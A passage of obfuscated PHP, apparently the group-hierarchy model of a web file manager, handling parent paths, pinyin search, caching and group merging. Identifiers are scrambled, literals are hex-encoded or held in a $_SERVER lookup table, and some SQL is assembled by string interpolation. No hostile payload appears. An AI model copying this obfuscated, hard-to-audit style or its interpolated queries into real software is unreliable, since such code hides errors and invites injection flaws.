(!empty($‰áïÄ˘∞[$ä—¿áòœ[441]])) { $÷ô…˛√≠ = $this->getInfoSimple($‰áïÄ˘∞[$ä—¿áòœ[441]]); if (!$÷ô…˛√≠) { return !1; } if ($ñ∞∞ﬂ¯ˆ[$ä—¿áòœ[1830]] == $÷ô…˛√≠[$ä—¿áòœ[1830]]) { return !1; } if ($‰áïÄ˘∞[$ä—¿áòœ[441]] != $ñ∞∞ﬂ¯ˆ[$ä—¿áòœ[441]]) { if ($÷ô…˛√≠[$ä—¿áòœ[530]] !== $ñ∞∞ﬂ¯ˆ[$ä—¿áòœ[530]] && strpos($÷ô…˛√≠[$ä—¿áòœ[530]], $ñ∞∞ﬂ¯ˆ[$ä—¿áòœ[530]] . $ñ∞∞ﬂ¯ˆ[$ä—¿áòœ[1830]] . $ä—¿áòœ[60]) === 0) { return !1; } $‰áïÄ˘∞[$ä—¿áòœ[599]] = $÷ô…˛√≠[$ä—¿áòœ[530]] . $‰áïÄ˘∞[$ä—¿áòœ[441]] . $ä—¿áòœ[60]; $this->_changeChildLevel($ñ∞∞ﬂ¯ˆ, $÷ô…˛√≠); } } if (isset($‰áïÄ˘∞[$ä—¿áòœ[42]])) { $this->setNamePinyin($ ˚≥±£â, $‰áïÄ˘∞[$ä—¿áòœ[42]]); } if (isset($‰áïÄ˘∞[$ä—¿áòœ[1916]])) { $this->metaSet($ ˚≥±£â, array($ä—¿áòœ[1916] => $‰áïÄ˘∞[$ä—¿áòœ[1916]], $ä—¿áòœ[1917] => $‰áïÄ˘∞[$ä—¿áòœ[1917]])); unset($‰áïÄ˘∞[$ä—¿áòœ[1916]]); unset($‰áïÄ˘∞[$ä—¿áòœ[1917]]); } $this->_clearChildrenCache($ñ∞∞ﬂ¯ˆ); return $this->where(array($ä—¿áòœ[1918] => $ ˚≥±£â))->save($‰áïÄ˘∞); } private function _clearChildrenCache($“Ê£°ÇÇ) { $ÅìŸÂê€ =& $_SERVER[Á≈ ä ∞]; $†ñôÌƒÆ = array($ÅìŸÂê€[599] => array($ÅìŸÂê€[559], $“Ê£°ÇÇ[$ÅìŸÂê€[530]] . $“Ê£°ÇÇ[$ÅìŸÂê€[1830]] . $ÅìŸÂê€[560])); $Òà˙ã§Ã = $this->field($ÅìŸÂê€[1830])->where($†ñôÌƒÆ)->select(); foreach ($Òà˙ã§Ã as $¶∞Ÿá˙â) { $this->_clearCache($¶∞Ÿá˙â[$ÅìŸÂê€[1830]]); } } private function _clearCache($¿“√Õ≈‚) { $Ãõú—¥à =& $_SERVER[Á≈ ä ∞]; $this->cacheFunctionClear($Ãõú—¥à[1912], $¿“√Õ≈‚); $this->cacheFunctionClear($Ãõú—¥à[1913], $¿“√Õ≈‚); } private function _changeChildLevel($∫à˜«π÷, $ññ‚§µ∏, $Ò…àÉÚ¶ = false) { $ﬁ©íââ¬ =& $_SERVER[Á≈ ä ∞]; $—Äª„µª = $∫à˜«π÷[$ﬁ©íââ¬[530]] . $∫à˜«π÷[$ﬁ©íââ¬[1830]] . $ﬁ©íââ¬[60]; $Çıö“ = $ññ‚§µ∏[$ﬁ©íââ¬[530]] . $ññ‚§µ∏[$ﬁ©íââ¬[1830]] . $ﬁ©íââ¬[60] . $∫à˜«π÷[$ﬁ©íââ¬[1830]] . $ﬁ©íââ¬[60]; if ($Ò…àÉÚ¶) { $Çıö“ = $ññ‚§µ∏[$ﬁ©íââ¬[530]] . $ññ‚§µ∏[$ﬁ©íââ¬[1830]] . $ﬁ©íââ¬[60]; } $™ˆ≤ÿÆ≤ = array($ﬁ©íââ¬[599] => array($ﬁ©íââ¬[559], $∫à˜«π÷[$ﬁ©íââ¬[530]] . $∫à˜«π÷[$ﬁ©íââ¬[1830]] . $ﬁ©íââ¬[560])); $¿∞∂‡èÒ = array($ﬁ©íââ¬[599] => array($ﬁ©íââ¬[608], "\x72\x65\160\154\x61\143\145\x28\160\141\x72\145\x6e\x74\x4c\145\x76\x65\x6c\54\47{$—Äª„µª}\47\x2c\x27{$Çıö“}\x27\x29")); $this->_clearChildrenCache($∫à˜«π÷); $this->where($™ˆ≤ÿÆ≤)->data($¿∞∂‡èÒ)->save(); } public function setNamePinyin($æ≠·∞ü≤, $è◊ı†ÚÍ = false) { $Ñõ¿âô‚ =& $_SERVER[Á≈ ä ∞]; if (!$è◊ı†ÚÍ) { $à»¸Õú® = $this->getInfoSimple($æ≠·∞ü≤); $è◊ı†ÚÍ = $à»¸Õú®[$Ñõ¿âô‚[42]]; } if (!Input::check($è◊ı†ÚÍ, $Ñõ¿âô‚[602])) { $this->metaSet($æ≠·∞ü≤, $Ñõ¿âô‚[474], null); $this->metaSet($æ≠·∞ü≤, $Ñõ¿âô‚[473], null); return; } $¨´´‚‹¸ = array($Ñõ¿âô‚[474] => str_replace($Ñõ¿âô‚[63], $Ñõ¿âô‚[22], Pinyin::get($è◊ı†ÚÍ)), $Ñõ¿âô‚[473] => Pinyin::get($è◊ı†ÚÍ, $Ñõ¿âô‚[603])); $this->metaSet($æ≠·∞ü≤, $¨´´‚‹¸); } protected function groupStatus($»ÖÛÙ÷π, $ÜﬂâéÕí) { $Ñ·ï¥˙ª =& $_SERVER[Á≈ ä ∞]; $ØìÚ˚®ò = $this->getInfoSimple($»ÖÛÙ÷π); if (!$ØìÚ˚®ò) { return !1; } if ($ÜﬂâéÕí == $Ñ·ï¥˙ª[98]) { $∞ÙÙÓ∞‰ = $this->parentLevelArray($ØìÚ˚®ò[$Ñ·ï¥˙ª[530]]); } else { $π≈ÇÈˆ¡ = array($Ñ·ï¥˙ª[599] => array($Ñ·ï¥˙ª[559], $ØìÚ˚®ò[$Ñ·ï¥˙ª[530]] . $ØìÚ˚®ò[$Ñ·ï¥˙ª[1830]] . $Ñ·ï¥˙ª[560])); $∞ÙÙÓ∞‰ = $this->where($π≈ÇÈˆ¡)->field($Ñ·ï¥˙ª[1830])->select(); $∞ÙÙÓ∞‰ = array_to_keyvalue($∞ÙÙÓ∞‰, $Ñ·ï¥˙ª[22], $Ñ·ï¥˙ª[1830]); } $∞ÙÙÓ∞‰[] = $ØìÚ˚®ò[$Ñ·ï¥˙ª[1830]]; $…€Ø”∞ü = array(); foreach ($∞ÙÙÓ∞‰ as $»ÖÛÙ÷π) { $…€Ø”∞ü[] = array($Ñ·ï¥˙ª[1830] => $»ÖÛÙ÷π, $Ñ·ï¥˙ª[104] => $Ñ·ï¥˙ª[757], $Ñ·ï¥˙ª[383] => $ÜﬂâéÕí); $this->_clearCache($»ÖÛÙ÷π); } return Model($Ñ·ï¥˙ª[1919])->addAll($…€Ø”∞ü, array(), !0); } protected function groupRemove($º¡æÊîˆ, $ÅÁ¸…çâ = false) { $†∂Úùªœ =& $_SERVER[Á≈ ä ∞]; $¡Õ–€Â± = array($†∂Úùªœ[1830] => $º¡æÊîˆ); $ºàŸ∑¯Ñ = $this->where($¡Õ–€Â±)->find(); if (!$ºàŸ∑¯Ñ || $ºàŸ∑¯Ñ[$†∂Úùªœ[441]] == 0) { return !1; } if (!$ÅÁ¸…çâ) { $ß⁄ë‰¯Ø = $this->getInfoSimple($ºàŸ∑¯Ñ[$†∂Úùªœ[441]]); $this->_changeChildLevel($ºàŸ∑¯Ñ, $ß⁄ë‰¯Ø, !0); $this->where(array($†∂Úùªœ[441] => $º¡æÊîˆ))->save(array($†∂Úùªœ[441] => $ºàŸ∑¯Ñ[$†∂Úùªœ[441]])); } Model($†∂Úùªœ[1919])->where($¡Õ–€Â±)->delete(); Model($†∂Úùªœ[1920])->where($¡Õ–€Â±)->delete(); Model($†∂Úùªœ[832])->groupRootRemove($º¡æÊîˆ); return $this->where($¡Õ–€Â±)->delete(); } protected function groupSort($”û®¸¸¶) { $ÅÄ·Ü≠í =& $_SERVER[Á≈ ä ∞]; $¥è—·˜• = array(); foreach ($”û®¸¸¶ as $¢≠π≈Ûê => $ÉÜí≈ê˘) { $¥è—·˜•[] = array($ÅÄ·Ü≠í[1830], $ÉÜí≈ê˘, $ÅÄ·Ü≠í[1854], $¢≠π≈Ûê + 1); } $this->saveAll($¥è—·˜•); } public function listData() { $ùπèÄ’º = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ùπèÄ’º[$_SERVER[Á≈ ä ∞][378]]); return $ùπèÄ’º; } private function _makeOrder($ÒéêÿÂÏ = '') { $µÅã±˝ü =& $_SERVER[Á≈ ä ∞]; $ÜÇ™˘÷Í = array($µÅã±˝ü[1830], $µÅã±˝ü[42], $µÅã±˝ü[1819], $µÅã±˝ü[210]); $êÈ€∆õ≠ = array($µÅã±˝ü[459] => $µÅã±˝ü[460], $µÅã±˝ü[461] => $µÅã±˝ü[462]); $äÄõÎóÊ = Input::get($µÅã±˝ü[466], $µÅã±˝ü[17], $µÅã±˝ü[1834], $ÜÇ™˘÷Í); $˙ÿã⁄»Ø = Input::get($µÅã±˝ü[467], $µÅã±˝ü[17], $µÅã±˝ü[1921], array($µÅã±˝ü[1921], $µÅã±˝ü[461])); $˙ÿã⁄»Ø = $êÈ€∆õ≠[$˙ÿã⁄»Ø]; $ÒéêÿÂÏ = $ÒéêÿÂÏ . "{$äÄõÎóÊ}\40{$˙ÿã⁄»Ø}\x2c\x20\147\x72\157\x75\x70\x49\104\40\x61\x73\x63"; return $this->order($ÒéêÿÂÏ); } public function listChild($∑¶¢Êêœ) { $∫¬ò≤Û≠ =& $_SERVER[Á≈ ä ∞]; $Åá¥ƒí˝ = $this->where(array($∫¬ò≤Û≠[441] => $∑¶¢Êêœ))->_makeOrder()->selectPage(200); $this->_listDataApply($Åá¥ƒí˝[$∫¬ò≤Û≠[378]]); return $Åá¥ƒí˝; } public function listChildIds($¯à•Ûåı) { $≠◊˘ü‡ó =& $_SERVER[Á≈ ä ∞]; if (is_string($√Î˚‘ó˚)) { $¯à•Ûåı = explode($≠◊˘ü‡ó[60], $¯à•Ûåı); } $øû¢’ÏÕ = $this->where(array($≠◊˘ü‡ó[1830] => array($≠◊˘ü‡ó[17], $¯à•Ûåı)))->field($≠◊˘ü‡ó[1922])->select(); if (!$øû¢’ÏÕ) { return !1; } $Üåí˛«í = array(); foreach ($øû¢’ÏÕ as $ôÆà¸Áù) { $Üåí˛«í[] = "\163\145\154\x65\143\164\40\147\x72\157\165\160\111\104\40\x66\162\x6f\155\40\x60\x67\162\157\165\160\140\40\167\x68\145\x72\145\x20\160\141\162\x65\x6e\x74\114\x65\x76\x65\154\x20\154\151\x6b\145\x20\47{$ôÆà¸Áù[$≠◊˘ü‡ó[530]]}{$ôÆà¸Áù[$≠◊˘ü‡ó[1830]]}\x2c\45\x27"; } $Üåí˛«í = implode($≠◊˘ü‡ó[1923], $Üåí˛«í); $øû¢’ÏÕ = $this->query($Üåí˛«í); if (!$øû¢’ÏÕ) { return array(); } $¯à•Ûåı = array_to_keyvalue($øû¢’ÏÕ, $≠◊˘ü‡ó[22], $≠◊˘ü‡ó[1830]); return array_unique($¯à•Ûåı); } public function listByID($ﬁ«˙Ùø÷) { $ÏèëÈ Ï =& $_SERVER[Á≈ ä ∞]; if (!$ﬁ«˙Ùø÷) { return array(); } $¶º†òÃ— = array($ÏèëÈ Ï[1830] => array($ÏèëÈ Ï[17], $ﬁ«˙Ùø÷)); $ÇÎª®˝ï = $this->where($¶º†òÃ—)->select(); $ÇÎª®˝ï = array_sort_keep($ÇÎª®˝ï, $ÏèëÈ Ï[1830], $ﬁ«˙Ùø÷); $this->_listDataApply($ÇÎª®˝ï); return $ÇÎª®˝ï; } public function listSearch($⁄´ø≤é¿) { $• Ë€Âü =& $_SERVER[Á≈ ä ∞]; $Ø˘‰°ù∏ = $⁄´ø≤é¿[$• Ë€Âü[1924]]; $ó’¬ÍÊµ = isset($⁄´ø≤é¿[$• Ë€Âü[1925]]) ? $⁄´ø≤é¿[$• Ë€Âü[1925]] : !1; if (!trim($Ø˘‰°ù∏)) { return !1; } $Ø˘‰°ù∏ = str_replace($• Ë€Âü[1926], $• Ë€Âü[1927], $Ø˘‰°ù∏); $˛…Êñ§∞ = array($• Ë€Âü[1830] => array($• Ë€Âü[392], "{$Ø˘‰°ù∏}\x25"), $• Ë€Âü[42] => array($• Ë€Âü[392], "\45{$Ø˘‰°ù∏}\45"), $• Ë€Âü[1003] => $• Ë€Âü[1928]); if ($ó’¬ÍÊµ) { $ìƒ°ì–Ç = $this->getInfoSimple($ó’¬ÍÊµ); $é£›€¥™ = $ìƒ°ì–Ç[$• Ë€Âü[530]] . $ó’¬ÍÊµ . $• Ë€Âü[560]; $˛…Êñ§∞ = array($˛…Êñ§∞, array($• Ë€Âü[530] => array($• Ë€Âü[392], $é£›€¥™))); } $˛…Êñ§∞ = $this->parseWhereLike($˛…Êñ§∞); $ôÂÓßâè = $this->_makeOrder()->where($˛…Êñ§∞)->selectPage(20); $ôÂÓßâè = $ôÂÓßâè ? $ôÂÓßâè : array($• Ë€Âü[378] => array(), $• Ë€Âü[375] => array()); if (!$ôÂÓßâè || count($ôÂÓßâè[$• Ë€Âü[378]]) < 5 && Input::check($Ø˘‰°ù∏, $• Ë€Âü[327])) { $˙ñ◊ëöÄ = $this->groupChildrenAll($ó’¬ÍÊµ); $˚íôƒÈ∆ = $this->_searchFromMeta($• Ë€Âü[473], $Ø˘‰°ù∏, 10, $˙ñ◊ëöÄ); $€ÕùÖæç = $this->_searchFromMeta($• Ë€Âü[474], $Ø˘‰°ù∏, 10, $˙ñ◊ëöÄ); $›üÌÌ˜ú = array_merge($˚íôƒÈ∆, $€ÕùÖæç, $ôÂÓßâè[$• Ë€Âü[378]]); $ôÂÓßâè[$• Ë€Âü[378]] = array_unique_by_key($›üÌÌ˜ú, $• Ë€Âü[1830]); $ôÂÓßâè[$• Ë€Âü[375]][$• Ë€Âü[376]] = count($ôÂÓßâè[$• Ë€Âü[378]]); $ôÂÓßâè[$• Ë€Âü[375]][$• Ë€Âü[377]] = ceil($ôÂÓßâè[$• Ë€Âü[375]][$• Ë€Âü[376]] / $ôÂÓßâè[$• Ë€Âü[375]][$• Ë€Âü[372]]); } $this->_listDataApply($ôÂÓßâè[$• Ë€Âü[378]]); return $ôÂÓßâè; } protected function groupChildrenAll($ÈπÏπœΩ) { $û∞ûå‘ =& $_SERVER[Á≈ ä ∞]; if (!$ÈπÏπœΩ) { return !1; } if (is_string($ÈπÏπœΩ)) { $ÈπÏπœΩ = array($ÈπÏπœΩ); } $º˚ÃªƒŸ = $ÈπÏπœΩ; foreach ($ÈπÏπœΩ as $ÛŸà’ùÒ) { $í›Ì˝†º = $this->getInfoSimple($ÛŸà’ùÒ); $–¬íåûË = array($û∞ûå‘[530] => array($û∞ûå‘[392], $í›Ì˝†º[$û∞ûå‘[530]] . $ÛŸà’ùÒ . $û∞ûå‘[560])); $˛‹æ˝èÁ = $this->field($û∞ûå‘[1830])->where($–¬íåûË)->select(); $º˚ÃªƒŸ = array_merge($º˚ÃªƒŸ, array_to_keyvalue($˛‹æ˝èÁ, $û∞ûå‘[22], $û∞ûå‘[1830])); } return array_unique($º˚ÃªƒŸ); } private function _searchFromMeta($Ç¥≈ï∑ı, $§ô’ﬁØŒ, $ÒïÙÈú», $è¶√·ıﬁ) { $£”¸¯òß =& $_SERVER[Á≈ ä ∞]; $§ô’ﬁØŒ = strtolower($§ô’ﬁØŒ); $˚õçΩπ… = array($£”¸¯òß[104] => $Ç¥≈ï∑ı, $£”¸¯òß[383] => array($£”¸¯òß[392], "\45{$§ô’ﬁØŒ}\45")); $˚õçΩπ… = $this->parseWhereLike($˚õçΩπ…); if ($è¶√·ıﬁ) { $˚õçΩπ…[$£”¸¯òß[1830]] = array($£”¸¯òß[17], $è¶√·ıﬁ); } $Ò„ö˛∆õ = Model($£”¸¯òß[1929])->where($˚õçΩπ…)->limit($ÒïÙÈú»)->select(); if (!$Ò„ö˛∆õ) { return array(); } $Ò„ö˛∆õ = array_to_keyvalue($Ò„ö˛∆õ, $£”¸¯òß[22], $£”¸¯òß[1830]); $ô‹¯ø˛± = $this->where(array($£”¸¯òß[1918] => array($£”¸¯òß[17], $Ò„ö˛∆õ)))->select(); if (!$ô‹¯ø˛±) { return array(); } return $ô‹¯ø˛±; } protected function _listDataApplyItem($óÇ≥±ü°) { $Á˛∂∏ò† = array($óÇ≥±ü°); $this->_listDataApply($Á˛∂∏ò†); return $Á˛∂∏ò†[0]; } protected function _listDataApply(&$…ÇØë¢¢) { $ªËÏÄã˛ =& $_SERVER[Á≈ ä ∞]; if (!$…ÇØë¢¢) { return; } $¶ÀûºêÖ = array_to_keyvalue($…ÇØë¢¢, $ªËÏÄã˛[22], $ªËÏÄã˛[1830]); $this->_listAppendChildren($…ÇØë¢¢); $this->_listAppendChildrenMember($…ÇØë¢¢); $this->_listAppendMeta($…ÇØë¢¢, $¶ÀûºêÖ); $this->_listAppendParent($…ÇØë¢¢); $this->_listAppendSourceRoot($…ÇØë¢¢, $¶ÀûºêÖ); } private function _listAppendChildren(&$Å˛À ›¥) { $áòìƒÓØ =& $_SERVER[Á≈ ä ∞]; $πÈê®£˘ = array_to_keyvalue($Å˛À ›¥, $áòìƒÓØ[22], $áòìƒÓØ[1830]); $Œ≠‘’ëÕ = array($áòìƒÓØ[441] => array($áòìƒÓØ[17], $πÈê®£˘)); $…‡ñπµ° = array($áòìƒÓØ[441], $áòìƒÓØ[1930] => $áòìƒÓØ[509]); $ã†îõ˝ß = $this->field($…‡ñπµ°)->where($Œ≠‘’ëÕ)->group($áòìƒÓØ[441])->select(); $é¢ïêêÁ = array_to_keyvalue($ã†îõ˝ß, $áòìƒÓØ[441], $áòìƒÓØ[509]); foreach ($Å˛À ›¥ as &$Ó ‚˙≥†) { $ãÄƒç≈Ä = $Ó ‚˙≥†[$áòìƒÓØ[1830]]; $Ó ‚˙≥†[$áòìƒÓØ[1931]] = isset($é¢ïêêÁ[$ãÄƒç≈Ä]) ? intval($é¢ïêêÁ[$ãÄƒç≈Ä]) : !1; } unset($Ó ‚˙≥†); } private function _listAppendChildrenMember(&$—«º’è’) { $úû±⁄›ë =& $_SERVER[Á≈ ä ∞]; $ ‹˙ı†ë = array_to_keyvalue($—«º’è’, $úû±⁄›ë[22], $úû±⁄›ë[1830]); $ Ö⁄Áƒ = array($úû±⁄›ë[1830] => array($úû±⁄›ë[17], $ ‹˙ı†ë)); $¨Ñ•ºÃ™ = array($úû±⁄›ë[1830], $úû±⁄›ë[1930] => $úû±⁄›ë[509]); $€”Â◊Ôñ = Model($úû±⁄›ë[1920])->field($¨Ñ•ºÃ™)->where($ Ö⁄Áƒ)->group($úû±⁄›ë[1830])->select(); $æ“°ÀÉ± = array_to_keyvalue($€”Â◊Ôñ, $úû±⁄›ë[1830], $úû±⁄›ë[509]); foreach ($—«º’è’ as &$ß‹˝∞Ú•) { $ïö˝€√ï = $ß‹˝∞Ú•[$úû±⁄›ë[1830]]; $ß‹˝∞Ú•[$úû±⁄›ë[1932]] = isset($æ“°ÀÉ±[$ïö˝€√ï]) ? intval($æ“°ÀÉ±[$ïö˝€√ï]) : !1; } unset($ß‹˝∞Ú•); } private function _listAppendMeta(&$À†ß◊Ç·, $«ﬂÚ†˘å) { $ò’™ΩÀÇ =& $_SERVER[Á≈ ä ∞]; $ØóÖı‚® = array($ò’™ΩÀÇ[1830] => array($ò’™ΩÀÇ[17], $«ﬂÚ†˘å)); $™∞ˆ‹ô™ = Model($ò’™ΩÀÇ[1919])->where($ØóÖı‚®)->select(); $™∞ˆ‹ô™ = array_to_keyvalue_group($™∞ˆ‹ô™, $ò’™ΩÀÇ[1830]); foreach ($™∞ˆ‹ô™ as &$ıˆπÓ£±) { $ıˆπÓ£± = array_to_keyvalue($ıˆπÓ£±, $ò’™ΩÀÇ[104], $ò’™ΩÀÇ[383]); } unset($ıˆπÓ£±); foreach ($À†ß◊Ç· as &$õÈÙÍ€„) { $õÈÙÍ€„[$ò’™ΩÀÇ[475]] = array(); if (isset($™∞ˆ‹ô™[$õÈÙÍ€„[$ò’™ΩÀÇ[1830]]])) { $õÈÙÍ€„[$ò’™ΩÀÇ[475]] = $™∞ˆ‹ô™[$õÈÙÍ€„[$ò’™ΩÀÇ[1830]]]; } } unset($õÈÙÍ€„); } protected function parentLevelArray($˙ñ’∞ÊÄ) { $«È¨ˆÄ˙ =& $_SERVER[Á≈ ä ∞]; $˙ñ’∞ÊÄ = explode($«È¨ˆÄ˙[60], trim($˙ñ’∞ÊÄ, $«È¨ˆÄ˙[60])); $˙ñ’∞ÊÄ = array_remove_value($˙ñ’∞ÊÄ, $«È¨ˆÄ˙[207]); return $˙ñ’∞ÊÄ; } protected function parentInGroup($πÂîÍ˚∞, $¬∞ª†Î„) { $ü‰Œí∂® =& $_SERVER[Á≈ ä ∞]; $õÕÒÍÑ¶ = $this->getInfoSimple($πÂîÍ˚∞); if (!$õÕÒÍÑ¶) { return !0; } $êΩÚ˝Ì´ = $this->parentLevelArray($õÕÒÍÑ¶[$ü‰Œí∂®[530]]); $êΩÚ˝Ì´[] = $πÂîÍ˚∞; foreach ($êΩÚ˝Ì´ as $πÂîÍ˚∞) { if (in_array($πÂîÍ˚∞ . $ü‰Œí∂®[22], $¬∞ª†Î„)) { return !0; } } return !1; } private function _listAppendParent(&$‡Á÷°¢Â) { $î‘˚é‰‡ =& $_SERVER[Á≈ ä ∞]; $ó‚·≤¶• = array(); foreach ($‡Á÷°¢Â as &$—ﬂÖ˘Ñç) { $ó‚·≤¶•[$—ﬂÖ˘Ñç[$î‘˚é‰‡[1830]]] = $—ﬂÖ˘Ñç[$î‘˚é‰‡[42]]; $ûí÷¬∂ˆ = $this->parentLevelArray($—ﬂÖ˘Ñç[$î‘˚é‰‡[530]]); foreach ($ûí÷¬∂ˆ as $££‹‘Ò”) { if (!isset($ó‚·≤¶•[$££‹‘Ò”])) { $ó‚·≤¶•[$££‹‘Ò”] = 0; } } } unset($—ﬂÖ˘Ñç); foreach ($ó‚·≤¶• as $ì¢ù˚÷Ë => $œ˝¶«≈Ω) { if ($œ˝¶«≈Ω) { continue; } $ΩÕÅ‹œ≈ = $this->getInfoSimple($ì¢ù˚÷Ë); $ó‚·≤¶•[$ì¢ù˚÷Ë] = $ΩÕÅ‹œ≈[$î‘˚é‰‡[42]]; } $§–Ï‘À’ = $GLOBALS[$î‘˚é‰‡[16]][$î‘˚é‰‡[99]][$î‘˚é‰‡[1933]]; if ($GLOBALS[$î‘˚é‰‡[512]] == $î‘˚é‰‡[98]) { $§–Ï‘À’ = !1; } foreach ($‡Á÷°¢Â as &$—ﬂÖ˘Ñç) { $ûí÷¬∂ˆ = $this->parentLevelArray($—ﬂÖ˘Ñç[$î‘˚é‰‡[530]]); $Ìïì¯—Ç = $î‘˚é‰‡[22]; foreach ($ûí÷¬∂ˆ as $ì¢ù˚÷Ë => $££‹‘Ò”) { if ($§–Ï‘À’ && $ì¢ù˚÷Ë == 0) { continue; } $Ìïì¯—Ç .= $ó‚·≤¶•[$££‹‘Ò”] . $î‘˚é‰‡[18]; } if ($ûí÷¬∂ˆ) { $Ìïì¯—Ç .= $—ﬂÖ˘Ñç[$î‘˚é‰‡[42]]; } $—ﬂÖ˘Ñç[$î‘˚é‰‡[535]] = str_replace($î‘˚é‰‡[538], $î‘˚é‰‡[18], $Ìïì¯—Ç); } unset($—ﬂÖ˘Ñç); } private function _listAppendSourceRoot(&$œ¢…æÕ´, $·ŒèàÙÿ) { $’»∫äÓ« =& $_SERVER[Á≈ ä ∞]; $⁄É∑œ©Ó = Model($’»∫äÓ«[832])->listSourceRoot(SourceModel::TYPE_GROUP, $·ŒèàÙÿ); $⁄É∑œ©Ó = array_to_keyvalue($⁄É∑œ©Ó, $’»∫äÓ«[514]); $⁄É∑œ©Ó = array_remove_key($⁄É∑œ©Ó, $’»∫äÓ«[514]); foreach ($œ¢…æÕ´ as &$“È¢Ä“π) { $“È¢Ä“π[$’»∫äÓ«[96]] = $⁄É∑œ©Ó[$“È¢Ä“π[$’»∫äÓ«[1830]]] ? $⁄É∑œ©Ó[$“È¢Ä“π[$’»∫äÓ«[1830]]] : array(); } unset($“È¢Ä“π); } protected function groupMerge($ê∆Èî˛á) { $ê∆Èî˛á = array_values(array_unique($ê∆Èî˛á)); $ì˘ÿ∏§¥ = array(); for ($©ÄÕÿßü = 0; $©ÄÕÿßü < count($ê∆Èî˛á); $©ÄÕÿßü++) { $÷ˆœè€— = !1; for ($˙„ﬂÆ“ = 0; $˙„ﬂÆ“ < count($ê∆Èî˛á); $˙„ﬂÆ“++) { if ($©ÄÕÿßü == $˙„ﬂÆ“) { continue; } if ($this->isParentOf($ê∆Èî˛á[$˙„ﬂÆ“], $ê∆Èî˛á[$©ÄÕÿßü])) { $÷ˆœè€— = !0; break; } } if (!$÷ˆœè€—) { $ì˘ÿ∏§¥[] = $ê∆Èî˛á[$©ÄÕÿßü]; } } return $ì˘ÿ∏§¥; } protected function isParentOf($™»˝ÆﬂÑ, $˘†ıΩƒÛ) { $∑ë ø≥√ =& $_SERVER[Á≈ ä ∞]; if (!$™»˝ÆﬂÑ || !$˘†ıΩƒÛ || $™»˝ÆﬂÑ == $˘†ıΩƒÛ) { return !1; } $ƒ…‹¸ä¯ = $this->getInfoSimple($™»˝ÆﬂÑ); $√◊äÃ˙Ÿ = $this->getInfoSimple($˘†ıΩƒÛ); $Âöõ·›é = $ƒ…‹¸ä¯[$∑ë ø≥√[530]] . $™»˝ÆﬂÑ . $∑ë ø≥√[60]; if (substr($√◊äÃ˙Ÿ[$∑ë ø≥√[530]], 0, strlen($Âöõ·›é)) == $Âöõ·›é) { return !0; } return !1; } public function groupShowRoot($ˆ©µµ˜¢, $á¯≥ÒÀ = false) { $˛ÂŒÇ‘º =& $_SERVER[Á≈ ä ∞]; $èõ‘ß°Ó = $this->getInfo($ˆ©µµ˜¢); if (!$èõ‘ß°Ó) { return array(); } $Ò©ºΩÚﬂ = $this->parentLevelArray($èõ‘ß°Ó[$˛ÂŒÇ‘º[530]]); $Ÿ€ó‰ã§ = array($ˆ©µµ˜¢); if (count($Ò©ºΩÚﬂ) == 0) { return $Ÿ€ó‰ã§; } if ($á¯≥ÒÀ && count($Ò©ºΩÚﬂ) == 1) { return $Ÿ€ó‰ã§; } if (!$èõ‘ß°Ó[$˛ÂŒÇ‘º[475]] || !isset($èõ‘ß°Ó[$˛ÂŒÇ‘º[475]][$˛ÂŒÇ‘º[1916]]) || $èõ‘ß°Ó[$˛ÂŒÇ‘º[475]][$˛ÂŒÇ‘º[1916]] == $˛ÂŒÇ‘º[1885]) { return $this->groupShowRoot($Ò©ºΩÚﬂ[count($Ò©ºΩÚﬂ) - 1], $á¯≥ÒÀ); } if ($èõ‘ß°Ó[$˛ÂŒÇ‘º[475]][$˛ÂŒÇ‘º[1916]] == $˛ÂŒÇ‘º[366]) { $÷“çÖ·± = explode($˛ÂŒÇ‘º[60], $èõ‘ß°Ó[$˛ÂŒÇ‘º[475]][$˛ÂŒÇ‘º[1917]]); if ($÷“çÖ·±) { $Ÿ€ó‰ã§ = array_merge($Ÿ€ó‰ã§, $÷“çÖ·±); } } return $Ÿ€ó‰ã§; } protected function resetParentLevel() { $ò˚∆ıÊÂ =& $_SERVER[Á≈ ä ∞]; $›É¬∫ó‹ = $ò˚∆ıÊÂ[1830]; $¥îóÊÚ◊ = $this->select(); $¥îóÊÚ◊ = array_to_keyvalue($¥îóÊÚ◊, $›É¬∫ó‹); foreach ($¥îóÊÚ◊ as $◊π£¢Ê†) { $ß‡∂Úñ´ = $◊π£¢Ê†; $ûËîÿçé = array(); while ($ß‡∂Úñ´[$ò˚∆ıÊÂ[441]] != 0) { $ûËîÿçé[] = $ß‡∂Úñ´[$ò˚∆ıÊÂ[441]]; $ß‡∂Úñ´ = $¥îóÊÚ◊[$ß‡∂Úñ´[$ò˚∆ıÊÂ[441]]]; } $ûËîÿçé[] = 0; $ûËîÿçé = $ò˚∆ıÊÂ[60] . implode($ò˚∆ıÊÂ[60], array_reverse($ûËîÿçé)) . $ò˚∆ıÊÂ[60]; $this->setNamePinyin($◊π£¢Ê†[$›É¬∫ó‹], $◊π£¢Ê†[$ò˚∆ıÊÂ[42]]); $this->where(array($›É¬∫ó‹ => $◊π£¢Ê†[$›É¬∫ó‹]))->save(array($ò˚∆ıÊÂ[599] => $ûËîÿçé)); } return $¥îóÊÚ◊; } public function groupNameAuto($‚∆‚€–Ù, $õ‡òÉÙ∫) { $‹ÈÍ¸Â™ =& $_SERVER[Á≈ ä ∞]; $¬åÆÒ†ç = $this->where(array($‹ÈÍ¸Â™[410] => $‚∆‚€–Ù))->getField($‹ÈÍ¸Â™[42], !0); if (!$¬åÆÒ†ç || !in_array($õ‡òÉÙ∫, $¬åÆÒ†ç)) { return $õ‡òÉÙ∫; } for ($‡¨˚•†◊ = 1; $‡¨˚•†◊ <= count($¬åÆÒ†ç) + 1; $‡¨˚•†◊++) { $ó∞ﬁÆÑˆ = $õ‡òÉÙ∫ . "\50{$‡¨˚•†◊}\x29"; if (!in_array($ó∞ﬁÆÑˆ, $¬åÆÒ†ç)) { return $ó∞ﬁÆÑˆ; } } } public function groupSwitch($’°üΩ’«, $≥¥îÄ¨«) { $±äπ⁄Õ“ =& $_SERVER[Á≈ ä ∞]; $∂Êãùˆ˙ = array($±äπ⁄Õ“[1830] => array($±äπ⁄Õ“[17], array($’°üΩ’«, $≥¥îÄ¨«))); $Ö◊Âôõ… = $this->where($∂Êãùˆ˙)->select(); $Ö◊Âôõ… = array_to_keyvalue($Ö◊Âôõ…, $±äπ⁄Õ“[1830]); if (!isset($Ö◊Âôõ…[$’°üΩ’«]) || !isset($Ö◊Âôõ…[$≥¥îÄ¨«]) || $Ö◊Âôõ…[$’°üΩ’«][$±äπ⁄Õ“[441]] == 0) { return !1; } 